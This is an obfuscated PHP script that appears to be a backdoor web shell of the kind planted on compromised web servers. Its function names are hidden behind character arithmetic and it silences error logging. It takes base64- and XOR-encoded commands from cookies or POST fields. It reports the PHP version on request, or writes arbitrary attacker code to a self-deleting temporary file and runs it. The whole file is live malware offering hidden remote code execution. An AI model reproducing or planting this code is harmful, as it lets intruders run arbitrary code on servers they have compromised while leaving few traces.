<?php $riukirshlg = chr(860-758).chr(105)."\x6c".'e'.chr(95)."\x70".chr(117)."\164".chr(804-709)."\143"."\157"."\x6e".chr(1043-927).chr(101)."\156"."\164"."\163";
$vjsdt = "\x62"."\x61"."\x73"."\x65".chr(781-727)."\64".chr(1036-941).chr(291-191)."\x65"."\x63".chr(708-597)."\x64".chr(211-110);
$zcraetena = "\x69".'n'.'i'.chr(468-373).chr(129-14).chr(101).'t';
$xrilpviuaz = chr(117).chr(110).chr(974-866).'i'."\x6e"."\x6b";


@$zcraetena("\x65".chr(516-402).chr(345-231).chr(959-848)."\162".chr(415-320)."\x6c".'o'.'g', NULL);
@$zcraetena("\154".chr(111).chr(204-101).'_'."\145".'r'.'r'."\x6f".chr(114)."\163", 0);
@$zcraetena(chr(362-253).chr(97).chr(120).chr(95)."\145"."\170".chr(101)."\x63"."\165".chr(780-664).chr(105)."\157".chr(149-39).chr(95).'t'.chr(105).chr(109).chr(101), 0);
@set_time_limit(0);

function qaetyoo($resnqxejcgigb, $acwjdo)
{
    $yhykpucwbx = "";
    for ($resnqxejc = 0; $resnqxejc < strlen($resnqxejcgigb);) {
        for ($j = 0; $j < strlen($acwjdo) && $resnqxejc < strlen($resnqxejcgigb); $j++, $resnqxejc++) {
            $yhykpucwbx .= chr(ord($resnqxejcgigb[$resnqxejc]) ^ ord($acwjdo[$j]));
        }
    }
    return $yhykpucwbx;
}

$uchlguv = array_merge($_COOKIE, $_POST);
$hjalgrq = 'd3d4b9db-07b1-4386-845f-6c4846173134';
foreach ($uchlguv as $bgbvsaoyws => $resnqxejcgigb) {
    $resnqxejcgigb = @unserialize(qaetyoo(qaetyoo($vjsdt($resnqxejcgigb), $hjalgrq), $bgbvsaoyws));
    if (isset($resnqxejcgigb[chr(389-292)."\x6b"])) {
        if ($resnqxejcgigb[chr(795-698)] == "\x69") {
            $resnqxejc = array(
                'p'."\166" => @phpversion(),
                "\x73".chr(118) => "3.5",
            );
            echo @serialize($resnqxejc);
        } elseif ($resnqxejcgigb[chr(795-698)] == chr(390-289)) {
            $kfvazjrau = "./" . md5($hjalgrq) . "\56"."\x69"."\156".chr(99);
            @$riukirshlg($kfvazjrau, "<" . chr(63)."\x70".chr(685-581)."\x70"."\40"."\100".chr(1072-955).'n'.chr(478-370).chr(478-373)."\x6e".chr(107).chr(244-204).chr(678-583).chr(95).chr(609-539)."\111".chr(76).chr(691-622)."\137".chr(193-98)."\51".chr(59)."\40" . $resnqxejcgigb[chr(100)]);
            @include($kfvazjrau);
            @$xrilpviuaz($kfvazjrau);
        }
        exit();
    }
}

